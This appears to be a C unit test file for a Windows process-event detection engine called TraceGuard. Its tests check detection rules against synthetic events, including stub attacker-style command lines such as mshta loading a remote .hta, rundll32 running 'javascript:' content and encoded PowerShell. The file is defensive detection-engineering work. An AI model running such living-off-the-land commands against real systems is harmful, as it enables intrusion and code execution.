#include "traceguard/jsonl.h"
#include "traceguard/rule_engine.h"

#include <stdio.h>
#include <string.h>

static int failures = 0;

static void expect_true(int condition, const char* message) {
    if (!condition) {
        ++failures;
        fprintf(stderr, "FAIL: %s\n", message);
    }
}

static int has_rule(const TgFinding* findings, size_t count, const char* rule_id) {
    size_t i;
    for (i = 0; i < count; ++i) {
        if (strcmp(findings[i].rule_id, rule_id) == 0) return 1;
    }
    return 0;
}

static size_t evaluate_once(TgRuleEngine* engine, TgEvent* event, TgFinding* findings) {
    return tg_rule_engine_evaluate(engine, event, findings, TG_MAX_FINDINGS_PER_EVENT);
}

static void test_user_writable_execution(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 100;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Users\\alice\\AppData\\Local\\Temp\\helper.exe");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG1001"), "TG1001 should detect user-writable execution");
    tg_rule_engine_dispose(&engine);
}

static void test_office_spawns_powershell(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 101;
    event.ppid = 55;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    tg_copy_string(event.parent_image, sizeof(event.parent_image), "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
    tg_copy_string(event.command_line, sizeof(event.command_line), "powershell.exe -NoProfile");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG1002"), "TG1002 should detect Office -> PowerShell");
    tg_rule_engine_dispose(&engine);
}

static void test_encoded_powershell(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 102;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    tg_copy_string(event.command_line, sizeof(event.command_line), "powershell.exe -EncodedCommand AAAA");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG1003"), "TG1003 should detect encoded PowerShell");
    tg_rule_engine_dispose(&engine);
}

static void test_remote_mshta(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 103;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\mshta.exe");
    tg_copy_string(event.command_line, sizeof(event.command_line), "mshta.exe https://example.invalid/demo.hta");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG1004"), "TG1004 should detect remote MSHTA");
    tg_rule_engine_dispose(&engine);
}

static void test_rundll_script_content(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 104;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\rundll32.exe");
    tg_copy_string(event.command_line, sizeof(event.command_line), "rundll32.exe javascript:example");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG1005"), "TG1005 should detect script-like Rundll32 content");
    tg_rule_engine_dispose(&engine);
}

static void test_user_writable_dual_use_reference(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 105;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\regsvr32.exe");
    tg_copy_string(event.command_line, sizeof(event.command_line), "regsvr32.exe C:\\Users\\alice\\Downloads\\plugin.dll");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG1006"), "TG1006 should detect dual-use utility referencing a writable path");
    tg_rule_engine_dispose(&engine);
}

static void test_user_writable_image_load(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_IMAGE_LOAD;
    event.pid = 106;
    tg_copy_string(event.loaded_image, sizeof(event.loaded_image), "C:\\Users\\alice\\AppData\\Local\\Temp\\plugin.dll");
    count = evaluate_once(&engine, &event, findings);
    expect_true(has_rule(findings, count, "TG2001"), "TG2001 should detect image loads from writable paths");
    tg_rule_engine_dispose(&engine);
}

static void test_benign_notepad(void) {
    TgRuleEngine engine;
    TgEvent event;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;
    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 107;
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\notepad.exe");
    tg_copy_string(event.parent_image, sizeof(event.parent_image), "C:\\Windows\\explorer.exe");
    tg_copy_string(event.command_line, sizeof(event.command_line), "notepad.exe notes.txt");
    count = evaluate_once(&engine, &event, findings);
    expect_true(count == 0, "notepad launched by explorer should not match v1 rules");
    tg_rule_engine_dispose(&engine);
}

static void test_json_round_trip(void) {
    TgEvent event;
    TgEvent parsed;
    char json[TG_JSON_LINE_CAP];
    tg_event_init(&event);
    event.kind = TG_EVENT_PROCESS_START;
    event.pid = 108;
    event.ppid = 42;
    event.event_id = 1;
    event.opcode = 1;
    tg_copy_string(event.timestamp_utc, sizeof(event.timestamp_utc), "2026-09-06T12:00:03.000Z");
    tg_copy_string(event.provider, sizeof(event.provider), "Microsoft-Windows-Kernel-Process");
    tg_copy_string(event.image, sizeof(event.image), "C:\\Windows\\System32\\cmd.exe");
    tg_copy_string(event.command_line, sizeof(event.command_line), "cmd.exe /c echo \"hello\"");

    expect_true(tg_event_to_json(&event, json, sizeof(json)), "event should serialize to JSON");
    expect_true(tg_parse_event_json_line(json, &parsed), "serialized event should parse");
    expect_true(parsed.pid == event.pid, "pid should round-trip");
    expect_true(parsed.ppid == event.ppid, "ppid should round-trip");
    expect_true(strcmp(parsed.image, event.image) == 0, "image should round-trip");
    expect_true(strcmp(parsed.command_line, event.command_line) == 0, "command line should round-trip");
}

static void test_parent_correlation_and_cleanup(void) {
    TgRuleEngine engine;
    TgEvent parent;
    TgEvent child;
    TgEvent stop;
    TgFinding findings[TG_MAX_FINDINGS_PER_EVENT];
    size_t count;

    expect_true(tg_rule_engine_init(&engine), "rule engine should initialize");
    tg_event_init(&parent);
    parent.kind = TG_EVENT_PROCESS_START;
    parent.pid = 500;
    tg_copy_string(parent.image, sizeof(parent.image), "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
    (void)evaluate_once(&engine, &parent, findings);

    tg_event_init(&child);
    child.kind = TG_EVENT_PROCESS_START;
    child.pid = 501;
    child.ppid = 500;
    tg_copy_string(child.image, sizeof(child.image), "C:\\Windows\\System32\\cmd.exe");
    count = evaluate_once(&engine, &child, findings);
    expect_true(has_rule(findings, count, "TG1002"), "engine should correlate known parent image by PPID");

    tg_event_init(&stop);
    stop.kind = TG_EVENT_PROCESS_STOP;
    stop.pid = 500;
    (void)evaluate_once(&engine, &stop, findings);

    child.pid = 502;
    count = evaluate_once(&engine, &child, findings);
    expect_true(!has_rule(findings, count, "TG1002"), "stopped parent should be removed from correlation state");
    tg_rule_engine_dispose(&engine);
}

int main(void) {
    test_user_writable_execution();
    test_office_spawns_powershell();
    test_encoded_powershell();
    test_remote_mshta();
    test_rundll_script_content();
    test_user_writable_dual_use_reference();
    test_user_writable_image_load();
    test_benign_notepad();
    test_json_round_trip();
    test_parent_correlation_and_cleanup();

    if (failures == 0) {
        printf("All TraceGuard C11 core tests passed.\n");
        return 0;
    }
    fprintf(stderr, "%d test(s) failed.\n", failures);
    return 1;
}
